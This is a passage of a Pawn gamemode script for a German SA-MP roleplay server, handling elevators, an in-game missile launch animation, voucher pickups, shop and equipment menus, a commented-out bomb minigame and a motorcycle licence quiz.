        SendClientMessageToAll(COLOR_RED, cmd);
    }


	return 1;
}

Function OnObjectMoved(objectid)
{
    new Float:x, Float:y, Float:z;


    // Loop
	for(new i; i < sizeof(BObj_FloorDoors); i ++)
	{
	    // Check if the object that moved was one of the elevator floor doors
		if(objectid == BObj_FloorDoors[i][0])
		{
		    GetObjectPos(BObj_FloorDoors[i][0], x, y, z);

            // Some floor doors have shut, move the elevator to next floor in queue:
            if (y < BY_DOOR_L_OPENED - 0.5)
		    {
				BElevator_MoveToFloor(BElevatorQueue[0]);
				BRemoveFirstQueueFloor();
			}
		}
	}

	if(objectid == BObj_Elevator)   // The elevator reached the specified floor.
	{
	    KillTimer(BElevatorBoostTimer);  // Kills the timer, in case the elevator reached the floor before boost.

	    BFloorRequestedBy[BElevatorFloor] = INVALID_PLAYER_ID;

	    BElevator_OpenDoors();
	    BFloor_OpenDoors(BElevatorFloor);

	    GetObjectPos(BObj_Elevator, x, y, z);
	    BLabel_Elevator	= Create3DTextLabel("{CCCCCC}Press '{FFFFFF}~k~~CONVERSATION_YES~{CCCCCC}' to use elevator", 0xCCCCCCAA, BX_ELEVATOR_POS + 1.6, BY_ELEVATOR_POS - 1.85, z - 0.4, 4.0, 0, 1);

	    BElevatorState 	= ELEVATOR_STATE_WAITING;
	    SetTimer("BElevator_TurnToIdle", ELEVATOR_WAIT_TIME, 0);
	}

	for(new i; i < sizeof(Obj_FloorDoors); i ++)
	{
		if(objectid == Obj_FloorDoors[i][0])
		{
		    GetObjectPos(Obj_FloorDoors[i][0], x, y, z);

		    if(x < X_DOOR_L_OPENED - 0.5)   // Some floor doors have shut, move the elevator to next floor in queue:
		    {
				Elevator_MoveToFloor(ElevatorQueue[0]);
				RemoveFirstQueueFloor();
			}
		}
	}

	if(objectid == Obj_Elevator)   // The elevator reached the specified floor.
	{
	    KillTimer(ElevatorBoostTimer);  // Kills the timer, in case the elevator reached the floor before boost.

	    FloorRequestedBy[ElevatorFloor] = INVALID_PLAYER_ID;

	    Elevator_OpenDoors();
	    Floor_OpenDoors(ElevatorFloor);

	    GetObjectPos(Obj_Elevator, x, y, z);
	    Label_Elevator	= Create3DTextLabel("Drücke 'F' um den Fahrstuhl zu benutzen", 0xFFFFDD, 1784.9822, -1302.0426, z - 0.9, 4.0, 0, 1);

	    ElevatorState 	= ELEVATOR_STATE_WAITING;
	    SetTimer("Elevator_TurnToIdle", ELEVATOR_WAIT_TIME, 0);
	}



	for(new i; i < sizeof(AObj_FloorDoors); i ++)
	{
	    // Check if the object that moved was one of the elevator floor doors
		if(objectid == AObj_FloorDoors[i][0])
		{
		    GetObjectPos(AObj_FloorDoors[i][0], x, y, z);

            // Some floor doors have shut, move the elevator to next floor in queue:
            if (y < Y_DOOR_L_OPENED - 0.5)
		    {
				AElevator_MoveToFloor(AElevatorQueue[0]);
				ARemoveFirstQueueFloor();
			}
		}
	}

	if(objectid == AObj_Elevator)   // The elevator reached the specified floor.
	{
	    KillTimer(AElevatorBoostTimer);  // Kills the timer, in case the elevator reached the floor before boost.

	    AFloorRequestedBy[AElevatorFloor] = INVALID_PLAYER_ID;

	    AElevator_OpenDoors();
	    AFloor_OpenDoors(AElevatorFloor);

	    GetObjectPos(AObj_Elevator, x, y, z);
	    ALabel_Elevator	= Create3DTextLabel("{CCCCCC}Press '{FFFFFF}~k~~CONVERSATION_YES~{CCCCCC}' to use elevator", 0xCCCCCCAA, AX_ELEVATOR_POS - 1.7, AY_ELEVATOR_POS - 1.75, z - 0.4, 4.0, 0, 1);

	    AElevatorState 	= ELEVATOR_STATE_WAITING;
	    SetTimer("AElevator_TurnToIdle", ELEVATOR_WAIT_TIME, 0);
	}
	/*
	if(objectid == Bombe[bombid])
	{
	    new Float:hax,Float:hay,Float:haz;
	    GetObjectPos(Bombe[bombid],hax,hay,haz);
	    CreateExplosion(hax,hay,haz,12,10.0);

		DestroyObject(Bombe[bombid]);

		SendClientMessageToAll(-1,"BOOOOOOOM");
	}*/

	// Raketen
	static Float:objPos[3];
	if(objectid == jetDoor && launchStep == LAUNCH_OPENGATE)
	{
		MoveObject(lift, 264.578125, 1888.5302734375, 15.166597366333, 1.5);
		MoveObject(missileObject[0], 268.8173828125, 1884.0546875, 14.281198501587, 1.5);
		launchStep = LAUNCH_LIFTUP;
	}
	if(objectid == lift && launchStep == LAUNCH_CLIFT)
	{
		MoveObject(jetDoor, 268.62051391602, 1884.1695556641, 16.040634155273, 0.5);
		launchStep = LAUNCH_NONE;
	}
	if(IsMissileObject(objectid))
	{
	    if(launchStep == LAUNCH_LIFTUP)
	    {
 			missileObject[1] = CreateObject(2780, 266.30206298828, 1882.7292480469, 16.03343963623, 0, 0, 29);
	    	missileObject[2] = CreateObject(2780, 268.78958129883, 1886.9494628906, -19.961563110352, 0, 0, 92.248413085938);
	    	missileObject[3] = CreateObject(2780, 270.27523803711, 1881.5205078125, 15.873435974121, 0, 0, 119.24664306641);
	    	launchStep = LAUNCH_READY;
		}
		else if(launchStep == LAUNCH_GO)
		{
		    for(new i = 0; i < (sizeof(missileObject)); i++)
		    {
		        GetObjectPos(missileObject[i], objPos[0], objPos[1], objPos[2]);
				MoveObject(missileObject[i], objPos[0], objPos[1], objPos[2] + 2.3, 0.6);
			}
			launchStep++;
		}
		else if(launchStep == LAUNCH_GO + 1)
		{
		    for(new i = 0; i < (sizeof(missileObject)); i++)
		    {
		        GetObjectPos(missileObject[i], objPos[0], objPos[1], objPos[2]);
				MoveObject(missileObject[i], objPos[0], objPos[1], objPos[2] + 2.3, 1.5);
			}
			launchStep++;
		}
		else if(launchStep == LAUNCH_GO + 2)
		{
		    for(new i = 0; i < (sizeof(missileObject)); i++)
		    {
		        GetObjectPos(missileObject[i], objPos[0], objPos[1], objPos[2]);
				MoveObject(missileObject[i], objPos[0], objPos[1], objPos[2] + 3.5, 2);
			}
			launchStep++;
		}
		else if(launchStep == LAUNCH_GO + 3)
		{
		    for(new i = 0; i < (sizeof(missileObject)); i++)
		    {
		        GetObjectPos(missileObject[i], objPos[0], objPos[1], objPos[2]);
				MoveObject(missileObject[i], objPos[0], objPos[1], objPos[2] + 3.5, 2.5);
			}
			launchStep++;
		}
		else if(launchStep == LAUNCH_GO + 4)
		{
		    for(new i = 0; i < (sizeof(missileObject)); i++)
		    {
		        GetObjectPos(missileObject[i], objPos[0], objPos[1], objPos[2]);
				MoveObject(missileObject[i], objPos[0], objPos[1], objPos[2] + 7.5, 4);
			}
			launchStep++;
		}
		else if(launchStep == LAUNCH_GO + 5)
		{
		    for(new i = 0; i < (sizeof(missileObject)); i++)
		    {
		        GetObjectPos(missileObject[i], objPos[0], objPos[1], objPos[2]);
				MoveObject(missileObject[i], objPos[0], objPos[1], objPos[2] + 7.5, 5.5);
			}
			MoveObject(jetDoor, 268.62051391602, 1884.1695556641, 16.040634155273, 0.5);
			MoveObject(lift, 264.57867431641, 1888.5306396484, -20.273397445679, 1.5);
			launchStep++;
		}
		else if(launchStep == LAUNCH_GO + 6)
		{
		    for(new i = 0; i < (sizeof(missileObject)); i++)
		    {
		        GetObjectPos(missileObject[i], objPos[0], objPos[1], objPos[2]);
				MoveObject(missileObject[i], objPos[0], objPos[1], objPos[2] + 7.5, 6);
			}
			launchStep++;
		}
		else if(launchStep == LAUNCH_GO + 7)
		{
		    for(new i = 0; i < (sizeof(missileObject)); i++)
		    {
		        GetObjectPos(missileObject[i], objPos[0], objPos[1], objPos[2]);
				MoveObject(missileObject[i], objPos[0], objPos[1], objPos[2] + 8, 8);
			}
			launchStep++;
		}
		else if(launchStep == LAUNCH_GO + 8)
		{
		    for(new i = 0; i < (sizeof(missileObject)); i++)
		    {
		        GetObjectPos(missileObject[i], objPos[0], objPos[1], objPos[2]);
				MoveObject(missileObject[i], objPos[0], objPos[1], objPos[2] + 10, 15);
			}
			launchStep++;
		}
		else if(launchStep == LAUNCH_GO + 9)
		{
		    for(new i = 0; i < (sizeof(missileObject)); i++)
		    {
		        GetObjectPos(missileObject[i], objPos[0], objPos[1], objPos[2]);
				MoveObject(missileObject[i], objPos[0], objPos[1], objPos[2] + 15, 20);
			}
			launchStep++;
		}
		else if(launchStep == LAUNCH_GO + 10)
		{
		    for(new i = 0; i < (sizeof(missileObject)); i++)
		    {
		        GetObjectPos(missileObject[i], objPos[0], objPos[1], objPos[2]);
				MoveObject(missileObject[i], objPos[0], objPos[1], objPos[2] + 35, 22);
			}
			launchStep++;
		}
		else if(launchStep == LAUNCH_GO + 11)
		{
		    for(new i = 0; i < (sizeof(missileObject)); i++)
		    {
		        GetObjectPos(missileObject[i], objPos[0], objPos[1], objPos[2]);
				MoveObject(missileObject[i], objPos[0], objPos[1], objPos[2] + 30, 27);
			}
			launchStep++;
		}
		else if(launchStep == LAUNCH_GO + 12)
		{
		    for(new i = 0; i < (sizeof(missileObject)); i++)
		    {
		        GetObjectPos(missileObject[i], objPos[0], objPos[1], objPos[2]);
				MoveObject(missileObject[i], objPos[0], objPos[1], objPos[2] + 30, 30);
			}
			launchStep++;
		}
		else if(launchStep == LAUNCH_GO + 13)
		{
		    for(new i = 0; i < (sizeof(missileObject)); i++)
		    {
		        GetObjectPos(missileObject[i], objPos[0], objPos[1], objPos[2]);
				MoveObject(missileObject[i], objPos[0], objPos[1], objPos[2] + 100, 30);
			}
			launchStep++;
		}
		else if(launchStep == LAUNCH_GO + 14)
		{
		    for(new i = 0; i < (sizeof(missileObject)); i++)
		    {
		        GetObjectPos(missileObject[i], objPos[0], objPos[1], objPos[2]);

		        if(RaketenSys[RaketenZiel] == 1)
		        {
		        	SetObjectRot(missileObject[i], RaketenSys[ZielX] ,RaketenSys[ZielY] ,RaketenSys[ZielZ]);
					MoveObject(missileObject[i],RaketenSys[ZielX] ,RaketenSys[ZielY] ,RaketenSys[ZielZ] , 60);
				}
				else
				{
				    SetObjectRot(missileObject[i], RaketenSys[PlayerZielX] ,RaketenSys[PlayerZielY] ,RaketenSys[PlayerZielZ]);
					MoveObject(missileObject[i],RaketenSys[PlayerZielX] ,RaketenSys[PlayerZielY] ,RaketenSys[PlayerZielZ] , 60);
				}
			}
			launchStep++;
		}
		else if(launchStep == LAUNCH_GO + 15)
		{
		    for(new i = 0; i < (sizeof(missileObject)); i++)
		    {
		        GetObjectPos(missileObject[i], objPos[0], objPos[1], objPos[2]);
				CreateExplosion(objPos[0], objPos[1], objPos[2], 7, 10);
				SetPlayerPos(0,objPos[0], objPos[1], objPos[2]);
				DestroyObject(missileObject[i]);

			}
			SendClientMessageToAll(-1,"Booooom");
			KillTimer(RaketenSys[RakPlayerTimer]);
			RaketenSys[RaketenZiel]=0;
			launchStep = LAUNCH_NOM;
		}
	}

	//





	return 1;
}

Function OnPlayerObjectMoved(playerid, objectid)
{

	return 1;
}

Function OnPlayerPickUpPickup(playerid,pickupid)
{



	if(pickupid == pickupX)
	{


				new Float:x, Float:y, Float:z;

			    GetPlayerPos(playerid, x, y, z);
			 	new LocationZone[MAX_ZONE_NAME];
			  	Get2DZone(x,y, LocationZone, MAX_ZONE_NAME);





				switch(pickup-1)
				{


				    case 0:
				    {
					new string[240];
	            format(string,sizeof(string),"%s hat das Pickup in %s gefunden, Gewinn: Unterbodenbeleuchtung Gutschein",GetName(playerid),LocationZone);
	            SendClientMessageToAll(COLOR_LIGHTBLUE,string);// /duty Sound von RPG Busfhrer


					new string3 = random(25000000000);

					new ahh43444[128];

					new ahh434[128];



					format(ahh434, sizeof(ahh434), "/gutscheine/%d.ini",string3);
					dini_Create(ahh434);

					dini_IntSet(ahh434, "result", 1);

					format(ahh43444, sizeof(ahh43444), "Gutschein Code: %d, Einzulösen mit /gutschein", string3);
					SendClientMessage(playerid, COLOR_LIGHTBLUE, ahh43444);


					}
				    case 1:
				    {
					new string[240];
	            format(string,sizeof(string),"%s hat das Pickup in %s gefunden, Gewinn: 10 Respektpunkte Gutschein",GetName(playerid),LocationZone);
	            SendClientMessageToAll(COLOR_LIGHTBLUE,string);// /duty Sound von RPG Busfhrer
					new string3 = random(25000000000);

					new ahh43444[128];

					new ahh434[128];



					format(ahh434, sizeof(ahh434), "/gutscheine/%d.ini",string3);
					dini_Create(ahh434);

					dini_IntSet(ahh434, "result", 2);

					format(ahh43444, sizeof(ahh43444), "Gutschein Code: %d, Einzulösen mit /gutschein", string3);
					SendClientMessage(playerid, COLOR_LIGHTBLUE, ahh43444);


					}
				    case 2:
				    {
					new string[240];
	            format(string,sizeof(string),"%s hat das Pickup in %s gefunden, Gewinn: Premium Permanent Gutschein",GetName(playerid),LocationZone);
	            SendClientMessageToAll(COLOR_LIGHTBLUE,string);// /duty Sound von RPG Busfhrer
					new string3 = random(25000000000);

					new ahh43444[128];

					new ahh434[128];



					format(ahh434, sizeof(ahh434), "/gutscheine/%d.ini",string3);
					dini_Create(ahh434);

					dini_IntSet(ahh434, "result", 3);

					format(ahh43444, sizeof(ahh43444), "Gutschein Code: %d, Einzulösen mit /gutschein", string3);
					SendClientMessage(playerid, COLOR_LIGHTBLUE, ahh43444);


					}
				    case 3:
				    {
					new string[240];
	            format(string,sizeof(string),"%s hat das Pickup in %s gefunden, Gewinn: Wunschkennzeichen Gutschein",GetName(playerid),LocationZone);
	            SendClientMessageToAll(COLOR_LIGHTBLUE,string);// /duty Sound von RPG Busfhrer
					new string3 = random(25000000000);

					new ahh43444[128];

					new ahh434[128];



					format(ahh434, sizeof(ahh434), "/gutscheine/%d.ini",string3);
					dini_Create(ahh434);

					dini_IntSet(ahh434, "result", 4);

					format(ahh43444, sizeof(ahh43444), "Gutschein Code: %d, Einzulösen mit /gutschein", string3);
					SendClientMessage(playerid, COLOR_LIGHTBLUE, ahh43444);


					}
				    case 4:
				    {
					new string[240];
	            format(string,sizeof(string),"%s hat das Pickup in %s gefunden, Gewinn: Wunschfahrzeug Gutschein",GetName(playerid),LocationZone);
	            SendClientMessageToAll(COLOR_LIGHTBLUE,string);// /duty Sound von RPG Busfhrer
					new string3 = random(25000000000);

					new ahh43444[128];

					new ahh434[128];



					format(ahh434, sizeof(ahh434), "/gutscheine/%d.ini",string3);
					dini_Create(ahh434);

					dini_IntSet(ahh434, "result", 5);

					format(ahh43444, sizeof(ahh43444), "Gutschein Code: %d, Einzulösen mit /gutschein", string3);
					SendClientMessage(playerid, COLOR_LIGHTBLUE, ahh43444);


					}
				    case 5:
				    {
					new string[240];
	            format(string,sizeof(string),"%s hat das Pickup in %s gefunden, Gewinn: Sonderlack Gutschein",GetName(playerid),LocationZone);
	            SendClientMessageToAll(COLOR_LIGHTBLUE,string);// /duty Sound von RPG Busfhrer
					new string3 = random(25000000000);

					new ahh43444[128];

					new ahh434[128];



					format(ahh434, sizeof(ahh434), "/gutscheine/%d.ini",string3);
					dini_Create(ahh434);

					dini_IntSet(ahh434, "result", 6);

					format(ahh43444, sizeof(ahh43444), "Gutschein Code: %d, Einzulösen mit /gutschein", string3);
					SendClientMessage(playerid, COLOR_LIGHTBLUE, ahh43444);


					}

				}






				pickup = 0;
        	    TextDrawSetString(Copyright,"www.gta.de");
				DestroyPickup(pickupX);
//				pickup = 0;


	}
	if(pickupid == healpickup)
	{
	    SetPlayerHealth(playerid, 100);
	}
	if(pickupid == spawnpickup)
	{
//	    SetPlayerSpawn(playerid);
	}
	if(pickupid == deaglepickup)
	{
	    ServerWeapon(playerid, 24, 500);
	}
	if(pickupid == armourpickup)
	{
	    SetPlayerArmour(playerid, 100);
	}

	if(pickupid == fixpoints)
	{
		    if(IsPlayerInAnyVehicle(playerid))
		    {
				if(IsACop(playerid))
		        {
	                SendClientMessage(playerid, COLOR_GRAD2, "Fahrzeug Repariert!");
	                RepairVehicle(GetPlayerVehicleID(playerid));
	            }
		    }
		return 1;
	}
	if(pickupid == fixpoints2)
	{
		    if(IsPlayerInAnyVehicle(playerid))
		    {
				if(IsACop(playerid))
		        {
	                SendClientMessage(playerid, COLOR_GRAD2, "Fahrzeug Repariert!");
					RepairVehicle(GetPlayerVehicleID(playerid));
	            }
		}
		return 1;
	}
	if(pickupid == fixpoints3)
	{
		    if(IsPlayerInAnyVehicle(playerid))
		    {
				if(IsACop(playerid))
		        {
	                SendClientMessage(playerid, COLOR_GRAD2, "Fahrzeug Repariert!");
					RepairVehicle(GetPlayerVehicleID(playerid));
	            }
		}
		return 1;
	}
	if(pickupid == fixpoints4)
	{
		    if(IsPlayerInAnyVehicle(playerid))
		    {
	   	 	    if(PlayerInfo[playerid][sMember] == 24)
	    	    {
	                SendClientMessage(playerid, COLOR_GRAD2, "Fahrzeug Repariert!");
					RepairVehicle(GetPlayerVehicleID(playerid));
	            }
		}
		return 1;
	}
	if(pickupid == EssenPickup[0] || pickupid == EssenPickup[1] || pickupid == EssenPickup[2])
	{
	    GameTextForPlayer(playerid,"~g~/menu",4000,3);
	}
	if(pickupid == KLEIDUNG_PRO)
	{
  		if(PlayerToPoint(3.0,playerid,199.0634,-128.0607,1003.5152))
  		{
			ShowPlayerDialog(playerid,DIALOG_KLEIDUNG_PRO,DIALOG_STYLE_LIST,"Pro Labs","Orange 12 Preis: 50$\nRockstar Grey Preis: 30$\nBase 5 Preis: 35$","Kaufen","Abbrechen");
		}
	}
	if(pickupid == KLEIDUNG_ZIP)
	{
  		if(PlayerToPoint(3.0,playerid,181.2543,-91.6659,1002.0234))
  		{
			ShowPlayerDialog(playerid,DIALOG_KLEIDUNG_ZIP,DIALOG_STYLE_LIST,"ZIP","Schwarzer Anzug&Rote Krawatte Preis: 100$\nPfarrer Anzug Preis: 300$\nCobaine-Style Preis: 200$\nSchwarzer Anzug Preis: 100$\nBlaue Jacke Preis: 120$\nBlauer Gestreifter Anzug Preis: 180$","Kaufen","Abbrechen");
		}
	}
	return 1;
}

Function OnPlayerSelectedMenuRow(playerid, row)
{
    new Menu:CurrentMenu = GetPlayerMenu(playerid);






	new string[240];
    if(CurrentMenu == FIREequip)
    {
	    switch(row)
	    {
		    case 0:
		    {
			    TogglePlayerControllable(playerid,1);
			    format(string,sizeof(string),"** %s nimmt sich einen Feuerlöscher aus dem Einsatzfahrzeug heraus **",GetName(playerid));
    		    ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			    ServerWeapon(playerid,42,9000);
			    SendClientMessage(playerid,COLOR_LIGHTBLUE,"Du hast dir einen Feuerlöscher aus dem Einsatzfahrzeug genommen.");
			    return 1;
		    }
		    case 1:
		    {
			    TogglePlayerControllable(playerid,1);
			    format(string,sizeof(string),"** %s nimmt sich eine Schaufel aus dem Einsatzfahrzeug heraus **",GetName(playerid));
    		    ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			    ServerWeapon(playerid,6,1);
			    SendClientMessage(playerid,COLOR_LIGHTBLUE,"Du hast dir eine Schaufel aus dem Einsatzfahrzeug genommen.");
			    return 1;
		    }
		    case 2:
		    {
			    TogglePlayerControllable(playerid,1);
			    format(string,sizeof(string),"** %s nimmt sich ein Spray aus dem Einsatzfahrzeug heraus **",GetName(playerid));
    		    ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
				ServerWeapon(playerid,41,500);
				SendClientMessage(playerid,COLOR_LIGHTBLUE,"Du hast dir ein Spray aus dem Einsatzfahrzeug genommen.");
				return 1;
		    }
		    case 3:
		    {
//			    if(Spieler[playerid][pFunkgeraet] == 1)return SendClientMessage(playerid,COLOR_GREY,"Du trägst bereits ein Funkgerät mit dir.");
			    TogglePlayerControllable(playerid,1);
			    format(string,sizeof(string),"** %s nimmt sich ein Funkgerät aus dem Einsatzfahrzeug heraus **",GetName(playerid));
    		    ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
//			    Spieler[playerid][pFunkgeraet] = 1;
			    SendClientMessage(playerid,COLOR_LIGHTBLUE,"Du hast dir ein Funkgerät aus dem Einsatzfahrzeug genommen.");
			    return 1;
		    }
		    case 4:
		    {
//			    if(Spieler[playerid][pMegaphon] == 1)return SendClientMessage(playerid,SAMP_WEISS,"Du trägst bereits ein Megaphon mit dir.");
			    TogglePlayerControllable(playerid,1);
			    format(string,sizeof(string),"** %s nimmt sich ein Megaphon aus dem Einsatzfahrzeug heraus **",GetName(playerid));
    		    ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
//			    Spieler[playerid][pMegaphon] = 1;
			    SendClientMessage(playerid,COLOR_LIGHTBLUE,"Du hast dir ein Megaphon aus dem Einsatzfahrzeug genommen.");
			    return 1;
		    }
		}
    }





/*
    if(CurrentMenu == BOMB)
    {
        switch(row)//rot,gelb,grün,blau
        {
            case 0://rot
			{
		        GetPlayerPos(playerid, PlayerExplosionX[1], PlayerExplosionY[1], PlayerExplosionZ[1]);
		        SendClientMessage(playerid, COLOR_LIGHTRED, "Bombe wurde gelegt! Du hast das Rote Draht genommen!");







				bombe[MAX_BOMBS[1++];

//JAS
				bombe[MAX_BOMBS] = CreateDynamicObject(1654, PlayerExplosionX[1], PlayerExplosionY[1], PlayerExplosionZ[1]-0.85, 0.0000, 0.0000, 0.0000);
				ApplyAnimation(playerid, "BOMBER", "BOM_Plant", 4.0, 0, 0, 0, 0, 0);
				bombexplotimer = SetTimerEx("bombexplode",60000,0,"i",playerid);
				BombStatus = 1;
				Bombactivated=1;
				bombdrahtchoosen = 1;
				bombdraht1 = 1;
				bombdraht2 = 0;
				bombdraht3 = 0;
				bombdraht4 = 0;
	 			for(new i = 0; i < MAX_PLAYERS; i++)
				{
		        	if(IsACop(i))
		        	{
						bombzone = GangZoneCreate(PlayerExplosionX[1]-random(60), PlayerExplosionY[1]-random(60), PlayerExplosionX[1]+random(60), PlayerExplosionY[1]+random(60));
						    SendClientMessage(i, COLOR_RED, "ZENTRALE: Es wurde eine Bombe gelegt!");
						    SendClientMessage(i, COLOR_RED, "ZENTRALE: Das Gebiet blinkt Rot und Grün.");
						    SendClientMessage(i, COLOR_RED, "ZENTRALE: Begeben sie sich zum Bombenplatz!");
    						GangZoneShowForPlayer(i,bombzone,COLOR_RED);
							GangZoneFlashForPlayer(i,bombzone,COLOR_GREEN);
					}
				}
			}
		 	case 1://gelb maul kadoffel
			{
		        GetPlayerPos(playerid, PlayerExplosionX[1], PlayerExplosionY[1], PlayerExplosionZ[1]);
		        SendClientMessage(playerid, COLOR_LIGHTRED, "Bombe wurde gelegt! Du hast das Gelbe Draht genommen!");
				bombe[MAX_BOMBS] =	CreateDynamicObject(1654, PlayerExplosionX[1], PlayerExplosionY[1], PlayerExplosionZ[1]-0.85, 0.0000, 0.0000, 0.0000);
				ApplyAnimation(playerid, "BOMBER", "BOM_Plant", 4.0, 0, 0, 0, 0, 0);
				bombexplotimer = SetTimerEx("bombexplode",60000,0,"i",playerid);
				BombStatus = 1;
				Bombactivated=1;
				bombdrahtchoosen = 1;
				bombdraht1 = 0;
				bombdraht2 = 1;
				bombdraht3 = 0;
				bombdraht4 = 0;
	 			for(new i = 0; i < MAX_PLAYERS; i++)
				{
		        	if(IsACop(i))
		        	{
						bombzone = GangZoneCreate(PlayerExplosionX[1]-random(60), PlayerExplosionY[1]-random(60), PlayerExplosionX[1]+random(60), PlayerExplosionY[1]+random(60));
						    SendClientMessage(i, COLOR_RED, "ZENTRALE: Es wurde eine Bombe gelegt!");
						    SendClientMessage(i, COLOR_RED, "ZENTRALE: Das Gebiet blinkt Rot und Grün.");
						    SendClientMessage(i, COLOR_RED, "ZENTRALE: Begeben sie sich zum Bombenplatz!");
    						GangZoneShowForPlayer(i,bombzone,COLOR_RED);
							GangZoneFlashForPlayer(i,bombzone,COLOR_GREEN);
					}
				}
			}
		 	case 2://grün
			{
		        GetPlayerPos(playerid, PlayerExplosionX[1], PlayerExplosionY[1], PlayerExplosionZ[1]);
		        SendClientMessage(playerid, COLOR_LIGHTRED, "Bombe wurde gelegt! Du hast das Grüne Draht genommen!");
				[MAX_BOMBS]bombe =	CreateDynamicObject(1654, PlayerExplosionX[1], PlayerExplosionY[1], PlayerExplosionZ[1]-0.85, 0.0000, 0.0000, 0.0000);
				ApplyAnimation(playerid, "BOMBER", "BOM_Plant", 4.0, 0, 0, 0, 0, 0);
				bombexplotimer = SetTimerEx("bombexplode",60000,0,"i",playerid);
				BombStatus = 1;
				Bombactivated=1;
				bombdrahtchoosen = 1;
				bombdraht1 = 0;
				bombdraht2 = 0;
				bombdraht3 = 1;
				bombdraht4 = 0;
	 			for(new i = 0; i < MAX_PLAYERS; i++)
				{
		        	if(IsACop(i))
		        	{
						bombzone = GangZoneCreate(PlayerExplosionX[1]-random(60), PlayerExplosionY[1]-random(60), PlayerExplosionX[1]+random(60), PlayerExplosionY[1]+random(60));
						    SendClientMessage(i, COLOR_RED, "ZENTRALE: Es wurde eine Bombe gelegt!");
						    SendClientMessage(i, COLOR_RED, "ZENTRALE: Das Gebiet blinkt Rot und Grün.");
						    SendClientMessage(i, COLOR_RED, "ZENTRALE: Begeben sie sich zum Bombenplatz!");
    						GangZoneShowForPlayer(i,bombzone,COLOR_RED);
							GangZoneFlashForPlayer(i,bombzone,COLOR_GREEN);
					}
				}
			}
			case 3://blau
			{
		        GetPlayerPos(playerid, PlayerExplosionX[1], PlayerExplosionY[1], PlayerExplosionZ[1]);
		        SendClientMessage(playerid, COLOR_LIGHTRED, "Bombe wurde gelegt! Du hast das Blaue Draht genommen!");
				[MAX_BOMBS]bombe =	CreateDynamicObject(1654, PlayerExplosionX[1], PlayerExplosionY[1], PlayerExplosionZ[1]-0.85, 0.0000, 0.0000, 0.0000);
				ApplyAnimation(playerid, "BOMBER", "BOM_Plant", 4.0, 0, 0, 0, 0, 0);
				bombexplotimer = SetTimerEx("bombexplode",60000,0,"i",playerid);
				BombStatus = 1;
				Bombactivated=1;
				bombdrahtchoosen = 1;
				bombdraht1 = 0;
				bombdraht2 = 0;
				bombdraht3 = 0;
				bombdraht4 = 1;
	 			for(new i = 0; i < MAX_PLAYERS; i++)
				{
		        	if(IsACop(i))
		        	{
						bombzone = GangZoneCreate(PlayerExplosionX[1]-random(60), PlayerExplosionY[1]-random(60), PlayerExplosionX[1]+random(60), PlayerExplosionY[1]+random(60));
						    SendClientMessage(i, COLOR_RED, "ZENTRALE: Es wurde eine Bombe gelegt!");
						    SendClientMessage(i, COLOR_RED, "ZENTRALE: Das Gebiet blinkt Rot und Grün.");
						    SendClientMessage(i, COLOR_RED, "ZENTRALE: Begeben sie sich zum Bombenplatz!");
    						GangZoneShowForPlayer(i,bombzone,COLOR_RED);
							GangZoneFlashForPlayer(i,bombzone,COLOR_GREEN);
					}
				}
			}
       	}
    }
    if(CurrentMenu == BOMBD && bombdrahtchoosen == 1)
    {
        switch(row)//rot,gelb,grün,blau
        {
            case 0://rot
			{//&& bombdraht2 = 0 || bombdraht3 = 0 || bombdraht4 && 0
			    if(bombdraht1 == 1)
			    {
			    	Bombtimer(3,playerid);
					bombdraht1 = 0;
					bombdraht2 = 0;
					bombdraht3 = 0;
					bombdraht4 = 1;
		    	}
		    	else if(bombdraht1 == 0)
		    	{
		    		bombexplode(playerid);
					bombdraht1 = 0;
					bombdraht2 = 0;
					bombdraht3 = 0;
					bombdraht4 = 1;
				}
				bombdrahtchoosen = 0;
			}
			case 1://gelb
			{
				bombdrahtchoosen = 0;
			    if(bombdraht2 == 1)
			    {
			    	Bombtimer(3,playerid);
					bombdraht1 = 0;
					bombdraht2 = 0;
					bombdraht3 = 0;
					bombdraht4 = 1;
		    	}
		    	else if(bombdraht2 == 0)
		    	{
		    		bombexplode(playerid);
					bombdraht1 = 0;
					bombdraht2 = 0;
					bombdraht3 = 0;
					bombdraht4 = 1;
				}
			}
			case 2://grün
			{
				bombdrahtchoosen = 0;
			    if(bombdraht3 == 1)
			    {
			    	Bombtimer(3,playerid);
					bombdraht1 = 0;
					bombdraht2 = 0;
					bombdraht3 = 0;
					bombdraht4 = 1;
				}
		    	else if(bombdraht3 == 0)
		    	{
		    		bombexplode(playerid);
					bombdraht1 = 0;
					bombdraht2 = 0;
					bombdraht3 = 0;
					bombdraht4 = 1;
				}
			}
			case 3://blau
			{
				bombdrahtchoosen = 0;
			    if(bombdraht4 == 1)
			    {
			    	Bombtimer(3,playerid);
					bombdraht1 = 0;
					bombdraht2 = 0;
					bombdraht3 = 0;
					bombdraht4 = 1;
				}
		    	else if(bombdraht4 == 0)
		    	{
		    		bombexplode(playerid);
					bombdraht1 = 0;
					bombdraht2 = 0;
					bombdraht3 = 0;
					bombdraht4 = 1;
				}
			}
		}
	}
*/
     if(CurrentMenu == MotorradMenu)
    {
        new antwort = row+1;
        if(MotorradSchritt[playerid] == 60) //Frage 1
		{
		    if(antwort == 2)
		    {
		        GameTextForPlayer(playerid,"~g~Das war Richtig",5000,3);
			    MotorradTimer[playerid] = SetTimerEx("Motorrad",1000,1,"i",playerid);
		    }
		    else OnPlayerFailedPruefung(playerid);
		}
		if(MotorradSchritt[playerid] == 80) //Frage 2
		{
		    if(antwort == 3)
		    {
		        GameTextForPlayer(playerid,"~g~Und das auch",5000,3);
			    MotorradTimer[playerid] = SetTimerEx("Motorrad",1000,1,"i",playerid);
		    }
		    else OnPlayerFailedPruefung(playerid);
		}
		if(MotorradSchritt[playerid] == 100)//Frage 3
		{
		    if(antwort == 1)
		    {
		        GameTextForPlayer(playerid,"~g~Gut mach weiter so",5000,3);
			    MotorradTimer[playerid] = SetTimerEx("Motorrad",1000,1,"i",playerid);
		    }
            else OnPlayerFailedPruefung(playerid);
		}
